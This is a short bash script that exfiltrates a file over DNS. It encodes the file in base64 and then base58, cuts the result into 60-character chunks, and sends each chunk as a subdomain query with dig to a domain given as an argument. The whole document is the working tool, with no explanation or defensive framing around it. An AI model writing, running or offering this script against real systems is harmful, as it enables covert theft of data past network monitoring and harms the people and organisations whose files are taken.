#!/bin/bash
file=$1
data=$(cat $file | base64 -w 0 | base58)
data_length=$(cat $file | base64 -w 0 | base58 | wc -c | awk -F " " '{print $1}')
domain=$2

i=1
while [[ $i -le $data_length ]]
do
    payload=$(echo $data | awk '{print substr($0,'$i',60)}')
    temp="${payload}.${domain}"
    dig $temp
    ((i = i + 60))
done
